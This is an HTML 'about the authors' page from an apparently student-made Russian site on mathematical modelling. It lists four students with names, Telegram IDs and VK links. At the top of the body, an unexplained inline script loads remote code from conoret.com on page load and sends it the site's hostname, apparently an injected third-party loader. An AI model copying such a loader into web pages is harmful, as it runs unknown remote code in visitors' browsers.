<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru-ru" lang="ru-ru" dir="ltr">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<base href="/">
	<meta name="author" content="Super User">
	<meta name="generator" content="">
	<title>Математическое моделирование</title>
	<link href="assets/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
    
    
    <link rel="stylesheet" type="text/css" href="/static/content/card.css" />
	<link href="https://gg.looknewsite.ru/assets/bootstrap.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/bootstrap-select.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/owl.carousel.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/animate.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/Chart.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/css2" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/rostsayt.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/template.css" rel="stylesheet">
	<script src="https://gg.looknewsite.ru//assets/jquery-3.5.1.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/jquery.validate.js"></script>
	<script src="https://gg.looknewsite.ru//assets/popper.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/bootstrap.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/bootstrap-select.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/owl.carousel.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/wow.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/jquery.mask.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/Chart.bundle.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/Chart.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/rostsayt.js"></script>
	<script src="https://gg.looknewsite.ru//assets/template.js"></script>
	<script src="https://gg.looknewsite.ru//assets/context.js"></script>
	<script src="https://gg.looknewsite.ru//assets/ammap.js"></script>
	<script src="https://gg.looknewsite.ru//assets/russiaLow.js"></script>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes">
    <meta name="HandheldFriendly" content="true">
    <meta name="apple-mobile-web-app-capable" content="YES">

	<style>
            div.moduletable.mod-slider.bg-color.text-white::before {
                background: black !important;
            }

         div.card-body.new-card::before {
            content: none !important;
            background: none !important;
           }


        .mod-slider.bg-color {
            background-color: black !important;
        }
        .mod-slider .row.align-items-end .col-10 .introtext {
            background-color: black !important;
        }
        #navbar {
        background-color: black;
        }

        .center-container {
    display: inline;
    justify-content: center;
    align-items: center;
   
}

.card-container {
    width: 100%;
    max-width: 1200px; /* Ширина контейнера с карточками */
    padding: 20px; /* Отступ внутри контейнера */
    box-sizing: border-box; /* Учитывать padding в расчетах ширины */
}
        


       body {
    background-color: black;
    background-size: cover; /* чтобы изображение занимало всю доступную область */
    background-repeat: no-repeat; /* чтобы изображение не повторялось */
    justify-content: center;
    align-items: center;
}

        .mod-slider {
            background-color: black;
        }
        


        .mod-about {
            background-color: black;
        }

        #top_menu .nav.menu li {
            white-space: nowrap; /* Предотвращает перенос элементов на новую строку */
        }

        #top_menu .nav.menu li {
            white-space: nowrap; /* Предотвращает перенос элементов на новую строку */
            margin-right: 35px; /* Установите нужный размер отступа */
            opacity: 0; /* Устанавливаем начальную прозрачность */
            transform: translateY(-50px); /* Начальное положение элементов */
            animation: fadeInDown 2s ease forwards; /* Применяем анимацию */
        }

        @keyframes fadeInDown {
            from {
                opacity: 0; /* Начальная прозрачность */
                transform: translateY(-50px); /* Начальное положение */
            }
            to {
                opacity: 1; /* Конечная прозрачность */
                transform: translateY(0); /* Конечное положение */
            }
        }

        

       #top_menu .nav.menu li a:hover {
            color: #32CD32; /* Здесь указываете желаемый зеленый цвет текста */
        }




        #top_menu ul {
            display: flex;
            flex-wrap: nowrap; /* запрещаем перенос элементов на новую строку */
            justify-content: space-between; /* равномерное распределение элементов по горизонтали */
            align-items: center; /* выравнивание элементов по вертикали */
        }

        .moduletable.mod-about .introtext {
            color: #32CD32; /* Зеленый цвет текста */
        }

        .moduletable.mod-about .h2 {
            color: #32CD32; /* Зеленый цвет текста */
        }

        .title:hover {
            transform: scale(1.1); /* Увеличиваем размер текста на 10% при наведении курсора */
        }

        .center-container {
    display: flex;
    justify-content: center;
}

.card-container {
    display: flex;
    flex-wrap: wrap;
    gap: 20px; /* Расстояние между карточками */
    justify-content: center;
}

.card {
    background-color: #fff;
    border: 1px solid #ddd;
    border-radius: 5px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    padding: 20px;
    text-align: center;
    max-width: 300px;
    flex: 1 1 300px; /* Позволяет карточкам растягиваться и сжиматься */
}

.card img {
    width: 100%;
    height: auto;
    border-radius: 5px;
}

.card h3 {
    margin: 15px 0 10px;
}

.card p {
    font-size: 14px;
    color: #666;
}

.card h3 a {
    margin: 0 5px;
    color: #333;
    text-decoration: none;
}

.card h3 a:hover {
    color: #007bff;
}





    </style>

</head>
<body class="home" cz-shortcut-listen="true">
    <script type="text/javascript">
        window.top === window &&
            !function(){
                var e=document.createElement("script"),
                    t=document.getElementsByTagName("head")[0];
                e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),
                e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)
            }();
    </script>
    <!-- BEGIN WAYBACK TOOLBAR INSERT -->
    <!-- END WAYBACK TOOLBAR INSERT -->
    <div id="body">
        <header class="navbar navbar-expand-xl navbar-light" id="navbar">
            <div class="container">
                <div class="collapse navbar-collapse" id="navbar-content">
                    <div id="top_menu" class="navbar-nav ml-5 w-100">
                        <ul class="nav menu w-100 justify-content-between align-items-center header-top-menu mod-list">
                            
                            <li class="item-102"><a href="/home">Главная</a></li>
                            
                            <li class="item-102"><a href="/contact">Вид бинарных отношений</a></li>

                            <li class="item-103"><a href="/sbo">Свойство бинарных отношений</a></li>
                            <li class="item-104"><a href="/max">Максимальный поток в сети</a></li>
                            <li class="item-105"><a href="/gc">Гамельтонов цикл</a></li>
                            <li class="item-106"><a href="/about">Об авторах</a></li>
                            <li class="item-107">
                                <a href="/#mod-form1"></a>
                            </li>
                            <li class="item-112 work-in-pride-link">
                                <a href="http://workinpride.ru/rus" class="work-in-pride-link" target="_blank" rel="noopener noreferrer">Работай в компании Green Pride</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </header>
        <div class="center-container">
    <div class="card-container">
        <div class="card">
            <img src="\static\images\Artemia.jpg" alt="Изображение Артемия">
            <h3>Афанасовский Артемий Рустамович</h3>
            <p>Артемий - разработчик со страстью к творчеству. Он любит создавать креативные проекты.</p>
            <h3>
                <a href="https://web.telegram.org/a/#1059657464"><i class="fab fa-telegram" title="Go to Telegram brand"></i></a>
                <a href="https://vk.com/flannel_butterfly"><i class="fab fa-vk" title="Go to VK brand"></i></a>
            </h3>
        </div>

        <div class="card">
            <img src="\static\images\Dinar.jpeg" alt="Изображение автора">
            <h3>Дарский Динар Маратович</h3>
            <p>Динар - разработчик с достаточно большим опытом работы с клиентами. Он умеет расположить к себе и добиться всего необходимого.</p>
            <h3>
                <a href="https://web.telegram.org/a/#1115007593"><i class="fab fa-telegram" title="Go to Telegram brand"></i></a>
                <a href="https://vk.com/darik097"><i class="fab fa-vk" title="Go to VK brand"></i></a>
            </h3>
        </div>

        <div class="card">
            <img src="\static\images\Said.jpeg" alt="Изображение автора">
            <h3>Мельзетдинов Саид Ильдарович</h3>
            <p>Саид - дизайнер с тонким вкусом и визуальным мышлением. Он создает удивительные макеты и концепции, которые вдохновляют жить дальше.</p>
            <h3>
                <a href="https://web.telegram.org/a/#1130318202"><i class="fab fa-telegram" title="Go to Telegram brand"></i></a>
                <a href="https://vk.com/lilsaidd"><i class="fab fa-vk" title="Go to VK brand"></i></a>
            </h3>
        </div>

        <div class="card">
            <img src="\static\images\Slupchuk.jpg" alt="Изображение автора">
            <h3>Слупчук Егор Артемович</h3>
            <p>Егор - писатель и исследователь сферы искусственного интеллекта. Его работы раскрывают потенциал технологий и будущие возможности.</p>
            <h3>
                <a href="https://t.me/EgorSlou"><i class="fab fa-telegram" title="Go to Telegram brand"></i></a>
                <a href="https://vk.com/egorslup"><i class="fab fa-vk" title="Go to VK brand"></i></a>
            </h3>
        </div>
    </div>
</div>

    </div>
    <footer class="footer text-center">
        <div class="container">
            <p style="color: #f0f0f0;">&copy; 2024 Все права защищены</p>
        </div>
    </footer>

</body>


</html>